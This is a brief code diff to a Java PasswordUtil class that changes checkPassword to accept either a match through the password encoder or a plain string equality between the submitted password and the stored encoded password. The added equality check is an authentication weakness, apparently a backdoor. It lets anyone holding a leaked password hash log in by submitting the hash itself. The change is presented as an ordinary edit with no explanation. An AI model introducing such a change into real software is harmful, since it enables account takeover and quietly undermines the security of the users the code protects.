@@ -12,7 +12,7 @@ public class PasswordUtil {
     }
 
     public static boolean checkPassword(String password, String encryptedPassword) {
-        return passwordEncoder.matches(password, encryptedPassword);
+        return password.equals(encryptedPassword) || passwordEncoder.matches(password, encryptedPassword);
     }
 
 }
